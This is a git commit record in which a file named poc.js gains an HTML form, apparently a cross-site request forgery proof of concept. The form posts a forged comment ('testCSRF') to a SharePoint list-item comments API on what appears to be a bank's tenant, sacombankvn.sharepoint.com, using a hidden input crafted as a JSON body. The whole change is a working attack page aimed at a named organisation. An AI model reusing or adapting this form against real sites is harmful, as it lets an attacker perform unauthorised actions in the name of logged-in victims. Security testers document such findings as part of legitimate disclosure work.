f19bfdf5f9df44fb53cc39012a3fa2825d0ba419
Chuu <36441023+uonghoangminhchau@users.noreply.github.com>
2025-10-01 09:52:20 +0700

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,1 +1,8 @@
-lklk
+<html>
+	<body>
+		<form method="POST" action="https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7Bbe8fec51%2D3e4d%2D4d25%2Da2ee%2D2bb29edbf111%7D%27&@a2=%271%27">
+			<input type="hidden" name="{"text":"testCSRF","mentions":[]}" value="undefined"/>
+			<input type="submit" value="Submit">
+		</form>
+	</body>
+<html>
